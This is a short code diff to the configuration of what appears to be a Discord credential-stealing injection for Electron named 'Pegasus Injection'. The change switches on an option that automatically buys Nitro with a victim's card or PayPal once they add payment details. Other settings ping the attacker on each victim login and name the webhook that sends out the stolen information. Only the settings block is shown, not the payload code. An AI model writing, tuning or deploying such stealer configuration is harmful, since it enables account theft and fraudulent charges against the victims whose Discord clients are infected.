@@ -5,7 +5,7 @@ const querystring = require("querystring");
 const { BrowserWindow, session } = require("electron");
 
 const config = {
-  auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
+  auto_buy_nitro: true, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
   ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
   ping_val: '@here', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
   embed_name: 'Pegasus Injection', //name of the webhook thats gonna send the info
